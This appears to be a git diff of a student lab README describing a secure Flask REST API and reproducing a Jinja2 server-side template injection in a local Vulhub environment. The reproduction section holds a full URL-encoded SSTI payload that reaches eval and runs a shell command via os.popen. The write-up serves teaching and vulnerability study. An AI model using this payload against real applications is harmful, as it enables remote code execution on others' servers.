@@ -1,25 +1,27 @@
 # Lab1 Secure REST API
+
 ## Project & API description
+
 Technology stack: Python Flask + SQLite + SQLAlchemy ORM
 Endpoints:
+
 1. POST /auth/register
 - Input JSON: {"username":"xxx","password":"xxx"}
 - Register new user, store bcrypt hashed password. Return 201 when success.
-
 2. POST /auth/login
 - Input JSON: {"username":"xxx","password":"xxx"}
 - Return JWT access‑token for authenticated users.
-
 3. GET /api/data
 - Protected endpoint, Header: Authorization: Bearer <token>
 - Return list of users.
 
 ## Implemented security measures
+
 1. SQL Injection protection:
-Use SQLAlchemy ORM, no manual string concatenation for SQL queries. ORM automatically uses parameterized prepared statements.
+   Use SQLAlchemy ORM, no manual string concatenation for SQL queries. ORM automatically uses parameterized prepared statements.
 
 2. XSS protection:
-Use markupsafe.escape() function to escape all user‑origin output data before returning in JSON responses.
+   Use markupsafe.escape() function to escape all user‑origin output data before returning in JSON responses.
 
 3. Broken Authentication protection:
 - Passwords are stored as bcrypt hash, never plaintext.
@@ -27,20 +29,50 @@ Use markupsafe.escape() function to escape all user‑origin output data before 
 - Custom token_required middleware validates JWT on every protected API call. Access is denied without valid token.
 
 ## SAST & SCA scan reports
-*(粘贴GitHub Actions截图)*
+
+![CI workflow cancelled screenshot](images/ci_screenshot.png)
 
 ## Selected CVE information
+
 CVE‑ID: CVE‑2019‑10906 Flask Jinja2 SSTI
-Brief description: Jinja2 template render function allows remote code execution if untrusted user input passed to render_string().
+Brief description: Flask is a popular Python web framework that uses Jinja2 as its template engine. A Server-Side Template Injection (SSTI) vulnerability can occur when user input is directly rendered in Jinja2 templates without proper sanitization, potentially leading to remote code execution.
 
 ## CVE reproduction steps
-*(命令、截图)*
+
+Execute the following commands to build and start a Web application based on Flask 1.1.1:
+
+```
+D:
+cd D:\vulhub-env\vulhub\flask\ssti
+docker-compose up -d
+```
+
+![](images/pic5.png)
+
+After the server starts, visit:
+
+```
+http://127.0.0.1:8000/?name={{7*7}}
+```
+
+![SSTI vulnerability verification(before fix)](images/pic1.png)
+
+```
+http://127.0.0.1:8000/?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D
+```
+
+![RCE exploitation result(before fix)](images/pic2.png)
 
 ## Root‑cause analysis
+
 *(根因分析)*
 
 ## Applied fix description
+
 *(修复描述)*
 
 ## Proof of fix
-*(修复验证截图)*
+
+![Verification after vulnerability fix](images/pic3.png)
+
+![Verification after vulnerability fix](pic4.png)
